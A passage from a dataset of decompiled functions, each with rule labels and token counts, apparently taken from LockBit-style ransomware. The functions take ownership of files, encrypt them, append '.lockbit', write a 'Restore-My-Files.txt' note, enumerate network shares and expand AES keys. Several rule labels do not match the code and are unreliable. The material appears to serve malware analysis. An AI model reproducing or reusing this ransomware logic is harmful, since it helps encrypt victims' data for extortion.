var_7ch;\n    uint var_78h;\n    uint var_74h;\n    uint var_70h;\n    uint var_6ch;\n    uint var_68h;\n    uint var_64h;\n    uint var_60h;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    uint var_48h;\n    uint var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint size;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    int32_t var_ch;\n    uint *var_8h;\n    int32_t var_4h;\n    \n    var_8h = param_1;\n    var_ch = (*_sym.imp.SHLWAPI.dll_PathFindExtensionW)(param_1);\n    var_40h = 0x72002e;\n    var_4h = 0;\n    var_3ch = 0x720061;\n    var_38h._0_2_ = 0;\n    var_4ch = 0x7a002e;\n    var_48h = 0x700069;\n    var_44h._0_2_ = 0;\n    var_18h = 0x37002e;\n    var_14h = 0x7a;\n    var_58h = 0x63002e;\n    var_54h = 0x70006b;\n    var_50h._0_2_ = 0;\n    var_128h = 0x64002e;\n    var_124h = 0x630061;\n    var_120h = 0x610070;\n    var_11ch = 99;\n    var_20h = 0x64002e;\n    var_1ch = 0x62;\n    var_138h = 0x64002e;\n    var_134h = 0x2d0062;\n    var_130h = 0x680073;\n    var_12ch = 0x6d;\n    var_148h = 0x64002e;\n    var_144h = 0x2d0062;\n    var_140h = 0x610077;\n    var_13ch = 0x6c;\n    var_64h = 0x64002e;\n    var_60h = 0x330062;\n    var_5ch._0_2_ = 0;\n    var_70h = 0x64002e;\n    var_6ch = 0x660062;\n    var_68h._0_2_ = 0;\n    var_7ch = 0x64002e;\n    var_78h = 0x630062;\n    var_74h._0_2_ = 0;\n    var_88h = 0x64002e;\n    var_84h = 0x730062;\n    var_80h._0_2_ = 0;\n    var_94h = 0x64002e;\n    var_90h = 0x740062;\n    var_8ch._0_2_ = 0;\n    var_a0h = 0x64002e;\n    var_9ch = 0x760062;\n    var_98h._0_2_ = 0;\n    var_ach = 0x66002e;\n    var_a8h = 0x6d0072;\n    var_a4h._0_2_ = 0;\n    var_b8h = 0x6d002e;\n    var_b4h = 0x660064;\n    var_b0h._0_2_ = 0;\n    var_c4h = 0x6d002e;\n    var_c0h = 0x670072;\n    var_bch._0_2_ = 0;\n    var_d0h = 0x6d002e;\n    var_cch = 0x620077;\n    var_c8h._0_2_ = 0;\n    var_dch = 0x6d002e;\n    var_d8h = 0x640079;\n    var_d4h._0_2_ = 0;\n    var_e8h = 0x6e002e;\n    var_e4h = 0x660064;\n    var_e0h._0_2_ = 0;\n    var_f4h = 0x71002e;\n    var_f0h = 0x790072;\n    var_ech._0_2_ = 0;\n    var_100h = 0x73002e;\n    var_fch = 0x620064;\n    var_f8h._0_2_ = 0;\n    var_10ch = 0x73002e;\n    var_108h = 0x660064;\n    var_104h._0_2_ = 0;\n    var_110h._0_2_ = 0;\n    var_15ch._0_2_ = 0;\n    iVar10 = 0;\n    var_2ch._0_2_ = 0;\n    var_240h = &var_40h;\n    var_23ch = &var_4ch;\n    var_238h = &var_18h;\n    var_234h = &var_58h;\n    var_230h = &var_128h;\n    var_22ch = &var_20h;\n    var_228h = &var_138h;\n    var_224h = &var_148h;\n    var_220h = &var_64h;\n    var_21ch = &var_70h;\n    var_218h = &var_7ch;\n    var_214h = &var_88h;\n    var_210h = &var_94h;\n    var_20ch = &var_a0h;\n    var_208h = &var_ach;\n    var_204h = &var_b8h;\n    var_200h = &var_c4h;\n    var_1fch = &var_d0h;\n    var_1f8h = &var_dch;\n    var_1f4h = &var_e8h;\n    var_1f0h = &var_f4h;\n    var_1ech = &var_100h;\n    var_1e8h = &var_10ch;\n    var_1e4h = &var_118h;\n    var_1e0h = &var_158h;\n    var_1dch = &var_16ch;\n    var_1d8h = &var_180h;\n    var_118h = 0x73002e;\n    var_114h = 0x6c0071;\n    var_158h = 0x73002e;\n    var_154h = 0x6c0071;\n    var_150h = 0x740069;\n    var_14ch = 0x65;\n    var_16ch = 0x73002e;\n    var_168h = 0x6c0071;\n    var_164h = 0x740069;\n    var_160h = 0x330065;\n    var_180h = 0x73002e;\n    var_17ch = 0x6c0071;\n    var_178h = 0x740069;\n    var_174h = 0x640065;\n    var_170h = 0x62;\n    var_34h = 0x74002e;\n    var_30h = 0x64006d;\n    var_1d4h = &var_34h;\n    var_1d0h = 0;\n    do {\n        if ((&var_240h)[iVar10] == NULL) break;\n        iVar7 = (*_sym.imp.KERNEL32.dll_lstrcmpiW)((&var_240h)[iVar10], var_ch);\n        if (iVar7 == 0) {\n            var_4h = 1;\n        }\n        iVar10 = iVar10 + 1;\n    } while (iVar10 < 0xff);\n    puVar11 = var_8h;\n    var_184h._0_2_ = 0;\n    ARG_1 = 0x730025;\n    var_194h = 0x6c002e;\n    var_190h = 0x63006f;\n    var_18ch = 0x62006b;\n    var_188h = 0x740069;\n    (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &ARG_1, var_8h);\n    iVar10 = 0;\n    var_ch = 0;\n    iVar7 = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar11, 0xc0010000, 0, 0, 3, 0x50000000, 0);\n    while (iVar7 == -1) {\n        if (*(in_FS_OFFSET + 0x34) != 5) {\n            return 0;\n        }\n        iVar7 = fcn.0041c440();\n        if (iVar7 != 1) {\n            var_8h = NULL;\n            bVar2 = false;\n            var_10h = 0;\n            (*_sym.imp.ntdll.dll_NtOpenProcessToken)(0xffffffff, 8, &var_8h);\n            puVar8 = (*_sym.imp.msvcrt.dll_malloc)(0x200);\n            if (((((puVar8 != NULL) &&\n                  (iVar10 = (*_sym.imp.ntdll.dll_NtQueryInformationToken)(var_8h, 1, puVar8, 0x200, &var_10h), \n                  iVar10 == 0)) &&\n                 (iVar10 = (*_sym.imp.ADVAPI32.dll_InitializeSecurityDescriptor)(&pSecurityDescriptor, 1),  iVar10 != 0)\n                 ) && ((iVar10 = (*_sym.imp.ADVAPI32.dll_SetSecurityDescriptorOwner)(&pSecurityDescriptor, *puVar8, 0), \n                       iVar10 != 0 &&\n                       (iVar10 = (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(puVar11, 1, &pSecurityDescriptor), \n                       iVar10 != 0)))) &&\n               (iVar10 = (*_sym.imp.ADVAPI32.dll_SetFileSecurityW)(puVar11, 4, &pSecurityDescriptor),  iVar10 != 0)) {\n                bVar2 = true;\n            }\n            if (var_8h != NULL) {\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(var_8h);\n            }\n            if (puVar8 != NULL) {\n                (*_sym.imp.msvcrt.dll_free)(puVar8);\n            }\n            iVar10 = var_ch;\n            if (!bVar2) {\n                return 0;\n            }\n        }\n        if (1 < iVar10) {\n            return 0;\n        }\n        iVar10 = iVar10 + 1;\n        var_ch = iVar10;\n        iVar7 = (*_sym.imp.KERNEL32.dll_CreateFileW)(puVar11, 0xc0010000, 0, 0, 3, 0x50000000, 0);\n    }\n    *0x428e64 = (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(iVar7, *0x428e64, 0, *0x42933c);\n    if ((*0x428e64 != -1) && (iVar10 = (*_sym.imp.msvcrt.dll_malloc)(0x40068),  iVar10 != 0)) {\n        *(iVar10 + 0x30) = var_4h;\n        *(iVar10 + 0x28) = 0;\n        *(iVar10 + 0x2c) = 0;\n        iVar9 = (*_sym.imp.KERNEL32.dll_GetFileSizeEx)(iVar7, iVar10 + 0x18);\n        if (iVar9 != 0) {\n            iVar9 = *(iVar10 + 0x1c);\n            uVar1 = *(iVar10 + 0x18);\n            if ((0 < iVar9) || ((-1 < iVar9 && (0xf < uVar1)))) {\n                *(iVar10 + 0x24) = 4;\n                *(iVar10 + 8) = uVar1 - 0x10;\n                *(iVar10 + 0x18) = *(iVar10 + 0x18);\n                *(iVar10 + 0x1c) = *(iVar10 + 0x1c);\n                *(iVar10 + 0xc) = iVar9 - (uVar1 < 0x10);\n                *(iVar10 + 0x10) = 0;\n                *(iVar10 + 0x20) = iVar7;\n                fcn.0040d210(iVar10 + 0x40034, 0x10);\n                fcn.0040d210(iVar10 + 0x40044, 0x10);\n                var_4h = (*_sym.imp.KERNEL32.dll_ReadFile)(*(iVar10 + 0x20), iVar10 + 0x34, 0x10, 0, iVar10);\n                if ((var_4h == 0) && (*(in_FS_OFFSET + 0x34) != 0x3e5)) {\n                    (*_sym.imp.msvcrt.dll_free)(iVar10);\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n                    return var_4h;\n                }\n                cVar6 = (*_sym.imp.ntdll.dll_RtlDosPathNameToNtPathName_U)(&ARG_0, &size, 0, 0);\n                if (cVar6 != '\\0') {\n                    var_4h = size + 0x10;\n                    arg_8h = (*_sym.imp.msvcrt.dll_malloc)(var_4h);\n                    fcn.0040cc00(arg_8h, 0, var_4h);\n                    if (arg_8h != NULL) {\n                        fcn.0040cbe0(arg_8h + 0xc, var_24h, size);\n                        *(arg_8h + 8) = size;\n                        *arg_8h = 0;\n                        *(arg_8h + 4) = 0;\n                        (*_sym.imp.ntdll.dll_NtSetInformationFile)(iVar7, &var_25ch, arg_8h, var_4h, 10);\n                        (*_sym.imp.msvcrt.dll_free)(arg_8h);\n                    }\n                }\n                LOCK();\n                *0x42930c = *0x42930c + 1;\n                puVar8 = &pszPath;\n                for (iVar10 = 0x82; iVar10 != 0; iVar10 = iVar10 + -1) {\n                    *puVar8 = *puVar11;\n                    puVar11 = puVar11 + 1;\n                    puVar8 = puVar8 + 1;\n                }\n                (*_sym.imp.SHLWAPI.dll_PathRemoveFileSpecW)(&pszPath);\n                var_1c8h = 0x730025;\n                var_1c4h = 0x52005c;\n                var_1c0h = 0x730065;\n                var_1bch = 0x6f0074;\n                var_1b8h = 0x650072;\n                var_1b4h = 0x4d002d;\n                var_1b0h = 0x2d0079;\n                var_1ach = 0x690046;\n                var_1a8h = 0x65006c;\n                var_1a4h = 0x2e0073;\n                var_1a0h = 0x780074;\n                var_19ch = 0x74;\n                (*_sym.imp.USER32.dll_wsprintfW)(&pszPath, &var_1c8h, &pszPath);\n                iVar10 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&pszPath, 0x40000000, 0, 0, 1, 0x50000000, 0);\n                if (iVar10 != -1) {\n                    *0x428e64 = (*_sym.imp.KERNEL32.dll_CreateIoCompletionPort)(iVar10, *0x428e64, 0, *0x42933c);\n                    if ((*0x428e64 != -1) &&\n                       (iVar7 = (*_sym.imp.msvcrt.dll_malloc)(0x40068),  uVar5 = *0x42932c,  iVar7 != 0)) {\n                        *(iVar7 + 0x24) = 3;\n                        uVar4 = *0x428e60;\n                        *(iVar7 + 8) = 0;\n                        *(iVar7 + 0xc) = 0;\n                        *(iVar7 + 0x10) = 0;\n                        *(iVar7 + 0x20) = iVar10;\n                        iVar9 = (*_sym.imp.KERNEL32.dll_WriteFile)(iVar10, uVar4, uVar5, 0, iVar7);\n                        if ((iVar9 != 0) || (*(in_FS_OFFSET + 0x34) == 0x3e5)) goto code_r0x0041de0b;\n                        (*_sym.imp.msvcrt.dll_free)(iVar7);\n                    }\n                    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar10);\n                }\ncode_r0x0041de0b:\n                pcVar3 = _sym.imp.KERNEL32.dll_Sleep;\n                LOCK();\n                iVar10 = *0x429330 + 1;\n                iVar7 = *0x429330 + 1;\n                *0x429330 = iVar10;\n                if (200 < iVar7) {\n                    do {\n                        (*pcVar3)(3);\n                    } while (0x31 < *0x429330);\n                }\n                return 1;\n            }\n        }\n        (*_sym.imp.msvcrt.dll_free)(iVar10);\n    }\n    (*_sym.imp.KERNEL32.dll_CloseHandle)(iVar7);\n    return 0;\n}\n",
        "token_count": 5083
    },
    "0041e150": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nuint __fastcall fcn.0041e150(uint param_1)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint uVar4;\n    uint *puVar5;\n    uint var_670h;\n    uint ARG_0;\n    uint var_58h;\n    uint var_54h;\n    uint var_48h;\n    uint *var_44h;\n    uint var_3ch;\n    uint *var_38h;\n    uint var_34h;\n    uint var_30h;\n    int32_t var_2ch;\n    uint32_t var_28h;\n    uint var_22h;\n    uint var_1eh;\n    uint var_1ah;\n    uint var_16h;\n    uint var_12h;\n    uint32_t var_eh;\n    uint var_ah;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    var_2ch = 0;\n    do {\n        var_28h = 0;\n        var_16h = 0x5c0076;\n        var_34h = 0;\n        var_30h = 0;\n        var_12h = 0x25005c;\n        var_eh = 0x53;\n        var_ah._0_2_ = *0x42413e;\n        var_ah._2_2_ = str._s_s[0];\n        var_6h = str._s_s[1];\n        var_4h = str._s_s[2];\n        var_2h = 0;\n        (*_sym.imp.USER32.dll_wsprintfW)(&ARG_0, &var_16h + 2, param_1);\n        var_54h = 0;\n        var_44h = &ARG_0;\n        var_48h = 0;\n        var_3ch = 0;\n        (*_sym.imp.MPR.dll_WNetAddConnection2W)(&var_58h, 0, 0, 0);\n        do {\n            iVar2 = (*_sym.imp.NETAPI32.dll_NetShareEnum)\n                              (param_1, 1, &var_38h, 0xffffffff, &var_28h, &var_34h, &var_30h);\n            if ((iVar2 != 0) && (iVar2 != 0xea)) break;\n            uVar3 = 1;\n            puVar5 = var_38h;\n            if (var_28h != 0) {\n                do {\n                    if (puVar5[1] == 0) {\n                        var_22h = 0x680034;\n                        var_1eh = 0x110068;\n                        var_1ah = 0x680047;\n                        var_eh = CONCAT22(str.WS2_32._4_2_, str.WS2_32._2_2_) ^ 0x340034;\n                        var_16h = 0x470011;\n                        var_ah._0_2_ = *0x424156 ^ 0x34;\n                        var_12h = CONCAT22(str.WS2_32._0_2_ ^ 0x34, 0x34);\n                        var_ah._2_2_ = str.inet_addr._0_2_ ^ 0x34;\n                        var_6h = str.inet_addr._2_2_ ^ 0x34;\n                        var_4h = str.inet_addr._4_2_ ^ 0x34;\n                        uVar3 = 0;\n                        do {\n                            *(&var_22h + uVar3 * 2 + 2) = *(&var_22h + uVar3 * 2 + 2) ^ 0x34;\n                            uVar3 = uVar3 + 1;\n                        } while (uVar3 < 0xf);\n                        var_2h = 0;\n                        (*_sym.imp.USER32.dll_wsprintfW)(&var_670h, &var_22h + 2, param_1, *puVar5);\n                        fcn.0040a910(&var_670h);\n                        pcVar1 = swi(3);\n                        uVar4 = (*pcVar1)();\n                        return uVar4;\n                    }\n                    uVar3 = uVar3 + 1;\n                    puVar5 = puVar5 + 3;\n                } while (uVar3 <= var_28h);\n            }\n            (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_38h);\n        } while (iVar2 == 0xea);\n        if (iVar2 != 5) {\n            return 1;\n        }\n        if (var_2ch != 0) {\n            return 1;\n        }\n        var_2ch = 1;\n        iVar2 = fcn.0041c260();\n        if (iVar2 == 0) {\n            return 1;\n        }\n    } while( true );\n}\n",
        "token_count": 1110
    },
    "0041e6f0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\nuint fcn.0041e6f0(void)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    uint uVar3;\n    uint32_t uVar4;\n    uchar auStack1432 [1428];\n    \n    LOCK();\n    *0x427114 = *0x427114 + 1;\n    iVar2 = (*_sym.imp.WS2_32.dll_WSAStartup)(0x202, auStack1432);\n    if (iVar2 == 0) {\n        *0x428f14 = (*_sym.imp.msvcrt.dll_malloc)(8);\n        if (*0x428f14 != 0) {\n            (*_sym.imp.ntdll.dll_RtlInitializeSListHead)(*0x428f14);\n            (*_sym.imp.ntdll.dll_RtlInitializeCriticalSection)(0x4292e0);\n            pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            fcn.0041e3e0();\n            if (*0x429348 != 0) {\n                uVar4 = 0;\n                do {\n                    fcn.0040cc20();\n                    uVar4 = uVar4 + 1;\n                } while (uVar4 < 0xff);\n                do {\n                    do {\n                        (*pcVar1)(1000);\n                    } while (*0x429348 != 0);\n                } while (*0x429344 != 0);\n                (*_sym.imp.ntdll.dll_RtlInterlockedFlushSList)(*0x428f14);\n                (*_sym.imp.ntdll.dll_RtlDeleteCriticalSection)(0x4292e0);\n                (*_sym.imp.WS2_32.dll_WSACleanup)();\n                LOCK();\n                *0x427114 = *0x427114 + -1;\n                (*_sym.imp.KERNEL32.dll_ExitThread)(0);\n                pcVar1 = swi(3);\n                uVar3 = (*pcVar1)();\n                return uVar3;\n            }\n            (*_sym.imp.ntdll.dll_RtlInterlockedFlushSList)(*0x428f14);\n            (*_sym.imp.ntdll.dll_RtlDeleteCriticalSection)(0x4292e0);\n        }\n        (*_sym.imp.WS2_32.dll_WSACleanup)();\n    }\n    return 0;\n}\n",
        "token_count": 505
    },
    "0041eaf0": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check Internet connectivity via WinINet/46117370ea204ccbaff71c7a54b55d32",
            "check OS version/730896de213f42198ce3af1d0fc93fbe",
            "check OS version/c2d5920d27eb4726b54299bacf904e17"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nvoid __cdecl fcn.0041eaf0(int32_t arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    code *pcVar1;\n    uint32_t uVar2;\n    uint uVar3;\n    int32_t iVar4;\n    int32_t in_FS_OFFSET;\n    uint var_3ah;\n    uint var_36h;\n    uint var_32h;\n    uint var_2eh;\n    uint var_2ah;\n    uint var_26h;\n    uint var_22h;\n    ushort var_1eh;\n    uint var_1ch;\n    uint16_t var_18h;\n    uint16_t var_16h;\n    uint16_t var_14h;\n    uint16_t var_12h;\n    uint16_t var_10h;\n    uint16_t var_eh;\n    uint16_t var_ch;\n    uint16_t var_ah;\n    uint16_t var_8h;\n    uint16_t var_6h;\n    uint16_t var_4h;\n    ushort var_2h;\n    \n    pcVar1 = _sym.imp.ntdll.dll_RtlInitUnicodeString;\n    if (*(arg_8h + 0x18) != *(*(*(in_FS_OFFSET + 0x18) + 0x30) + 8)) {\n        *arg_10h = 0;\n        return;\n    }\n    uVar3 = *0x429300;\n    iVar4 = *0x429304;\n    if (arg_ch == 0) {\n        *0x429304 = *(arg_8h + 0x30);\n        *0x429300 = *(arg_8h + 0x28);\n        var_1ch._0_2_ = *0x4241a4 ^ 0x22;\n        var_3ah = 0x7e0022;\n        var_1ch._2_2_ = *0x4241a6 ^ 0x22;\n        var_36h = 0x5a0047;\n        var_18h = *0x4241a8 ^ 0x22;\n        var_32h = 0x4e0052;\n        var_16h = *0x4241aa ^ 0x22;\n        var_2eh = 0x50004d;\n        var_14h = *0x4241ac ^ 0x22;\n        var_2ah = 0x500047;\n        var_12h = *0x4241ae ^ 0x22;\n        var_26h = 0x47000c;\n        var_10h = *0x4241b0 ^ 0x22;\n        var_22h = 0x47005a;\n        var_eh = *0x4241b2 ^ 0x22;\n        var_1eh = 0x22;\n        var_ch = *0x4241b4 ^ 0x22;\n        var_ah = *0x4241b6 ^ 0x22;\n        var_8h = *0x4241b8 ^ 0x22;\n        var_6h = *0x4241ba ^ 0x22;\n        var_4h = *0x4241bc ^ 0x22;\n        uVar2 = 0;\n        do {\n            *(&var_3ah + uVar2 * 2 + 2) = *(&var_3ah + uVar2 * 2 + 2) ^ 0x22;\n            uVar2 = uVar2 + 1;\n        } while (uVar2 < 0x1b);\n        var_2h = 0;\n        uVar3 = *0x42934c;\n        iVar4 = &var_3ah + 2;\n    }\n    (*_sym.imp.ntdll.dll_RtlInitUnicodeString)(arg_8h + 0x24, uVar3);\n    (*pcVar1)(arg_8h + 0x2c, iVar4);\n    *arg_10h = 1;\n    return;\n}\n",
        "token_count": 910
    },
    "00401780": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\n// WARNING: Could not reconcile some variable overlaps\n\nint32_t __cdecl\nfcn.00401780(uint *arg_8h, uint arg_ch, uint32_t arg_10h, uint noname_3, uint noname_4, uint noname_5, uint noname_6, \n            uint noname_7, uint noname_8, uint noname_9, uint noname_10, uint noname_11, uint noname_12, uint noname_13\n            , uint noname_14, uint noname_15, uint noname_16, uint noname_17, uint noname_18, uint noname_19, \n            uint noname_20, uint noname_21, uint noname_22, uint noname_23, uint noname_24, uint noname_25, \n            uint noname_26, uint noname_27, uint noname_28, uint noname_29, uint arg_80h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint8_t *puVar4;\n    int32_t iVar5;\n    uint *puVar6;\n    uint32_t uVar7;\n    uint var_31ch;\n    uint var_204h;\n    uchar var_1f4h;\n    uchar var_1f3h;\n    uchar var_1f2h;\n    uint var_1f1h;\n    uchar var_1edh;\n    uint var_1ech;\n    uint var_64h;\n    uint var_44h;\n    uint var_24h;\n    uint uStack36;\n    uint uStack32;\n    uint uStack28;\n    uint var_14h;\n    uint uStack20;\n    uint uStack16;\n    uint uStack12;\n    uint32_t var_4h;\n    \n    if (0x180 < arg_10h) {\n        return -0x38;\n    }\n    fcn.0040cc00(&var_204h, 0, 0x1a0);\n    fcn.00406370(&var_31ch);\n    var_1f1h._0_1_ = arg_10h;\n    var_1f4h = arg_10h >> 0x18;\n    var_1f3h = arg_10h >> 0x10;\n    var_1f2h = arg_10h >> 8;\n    var_1edh = 0x30;\n    fcn.0040cbe0(&var_1ech, arg_ch, arg_10h);\n    uVar7 = arg_10h + 0x19;\n    *(&var_1ech + arg_10h) = 0x80;\n    iVar1 = 0;\n    do {\n        *(&var_64h + iVar1) = iVar1;\n        iVar1 = iVar1 + 1;\n    } while (iVar1 < 0x20);\n    var_4h = uVar7;\n    iVar2 = fcn.00406390(&var_31ch, &var_64h, 0x100);\n    iVar1 = iVar2;\n    if (iVar2 == 0) {\n        do {\n            var_14h = 0;\n            uStack20 = 0;\n            uStack16 = 0;\n            uStack12 = 0;\n            _var_14h = ZEXT816(0);\n            if (uVar7 != 0) {\n                iVar5 = -0x1f0;\n                do {\n                    iVar1 = 0;\n                    do {\n                        puVar4 = &var_14h + iVar1;\n                        iVar1 = iVar1 + 1;\n                        *puVar4 = *puVar4 ^ puVar4[iVar5];\n                    } while (iVar1 < 0x10);\n                    iVar5 = iVar5 + 0x10;\n                    uVar3 = uVar7;\n                    if (0xf < uVar7) {\n                        uVar3 = 0x10;\n                    }\n                    uVar7 = uVar7 - uVar3;\n                    iVar1 = fcn.00406320(&var_31ch, 1, &var_14h, &var_14h);\n                    if (iVar1 != 0) goto code_r0x00401914;\n                } while (uVar7 != 0);\n                uVar7 = var_4h;\n            }\n            var_204h._3_1_ = var_204h._3_1_ + '\\x01';\n            *(&var_44h + iVar2) = CONCAT412(uStack12, CONCAT48(uStack16, CONCAT44(uStack20, var_14h)));\n            iVar2 = iVar2 + 0x10;\n        } while (iVar2 < 0x30);\n        iVar1 = fcn.00406390(&var_31ch, &var_44h, 0x100);\n        if (iVar1 == 0) {\n            iVar2 = 0;\n            puVar6 = arg_8h;\n            do {\n                iVar1 = fcn.00406320(&var_31ch, 1, &var_24h, &var_24h);\n                if (iVar1 != 0) break;\n                iVar2 = iVar2 + 0x10;\n                *puVar6 = var_24h;\n                puVar6[1] = uStack36;\n                puVar6[2] = uStack32;\n                puVar6[3] = uStack28;\n                puVar6 = puVar6 + 4;\n            } while (iVar2 < 0x30);\n        }\n    }\ncode_r0x00401914:\n    fcn.00406350(&var_31ch);\n    fcn.00408120(&var_204h, 0x1a0);\n    fcn.00408120(&var_44h, 0x30);\n    fcn.00408120(&var_64h, 0x20);\n    fcn.00408120(&var_14h, 0x10);\n    if (iVar1 != 0) {\n        fcn.00408120(arg_8h, 0x30);\n    }\n    return iVar1;\n}\n",
        "token_count": 1375
    },
    "00406390": {
        "rules": [
            "hash data using murmur3/51beaa2d5a2f415db2ae4fc8ef819b72/938ec34b87fc49598ca2362852471498"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00406390(int32_t *arg_8h, uint32_t *arg_ch, int32_t arg_10h)\n\n{\n    uint32_t uVar1;\n    uint32_t uVar2;\n    uint32_t uVar3;\n    uint32_t uVar4;\n    uint var_8h;\n    uint var_4h;\n    \n    if (arg_10h == 0x80) {\n        *arg_8h = 10;\n    }\n    else if (arg_10h == 0xc0) {\n        *arg_8h = 0xc;\n    }\n    else {\n        if (arg_10h != 0x100) {\n            return 0xffffffe0;\n        }\n        *arg_8h = 0xe;\n    }\n    arg_8h[1] = arg_8h + 2;\n    uVar4 = *arg_ch;\n    arg_8h[2] = uVar4;\n    arg_8h[3] = arg_ch[1];\n    arg_8h[4] = arg_ch[2];\n    uVar3 = arg_ch[3];\n    arg_8h[5] = uVar3;\n    if (*arg_8h == 10) {\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 1;\n        uVar1 = arg_8h[3] ^ uVar4;\n        arg_8h[6] = uVar4;\n        uVar2 = arg_8h[4] ^ uVar1;\n        arg_8h[7] = uVar1;\n        uVar3 = uVar3 ^ uVar2;\n        arg_8h[9] = uVar3;\n        arg_8h[8] = uVar2;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 2;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[10] = uVar4;\n        arg_8h[0xb] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0xc] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0xd] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 4;\n        arg_8h[0xe] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0xf] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x10] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x11] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 8;\n        arg_8h[0x12] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x13] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x14] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x15] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[uVar3 >> 8 & 0xff]) ^ uVar4 ^ 0x10;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x16] = uVar4;\n        arg_8h[0x17] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x18] = uVar2;\n        arg_8h[0x19] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[uVar3 >> 0x18]), str.cw[uVar3 >> 0x10 & 0xff]), \n                         str.cw[*(arg_8h + 0x65)]) ^ uVar4 ^ 0x20;\n        arg_8h[0x1a] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x1b] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x1c] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x1d] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x77)]), str.cw[*(arg_8h + 0x76)]), \n                         str.cw[*(arg_8h + 0x75)]) ^ uVar4 ^ 0x40;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x1e] = uVar4;\n        arg_8h[0x1f] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x20] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x21] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], str.cw[*(arg_8h + 0x87)]), str.cw[*(arg_8h + 0x86)]), \n                         str.cw[*(arg_8h + 0x85)]) ^ uVar4 ^ 0x80;\n        arg_8h[0x22] = uVar4;\n        uVar1 = uVar4 ^ uVar1;\n        arg_8h[0x23] = uVar1;\n        uVar2 = uVar1 ^ uVar2;\n        arg_8h[0x24] = uVar2;\n        uVar3 = uVar2 ^ uVar3;\n        arg_8h[0x25] = uVar3;\n        uVar4 = CONCAT31(CONCAT21(CONCAT11(str.cw[uVar3 & 0xff], 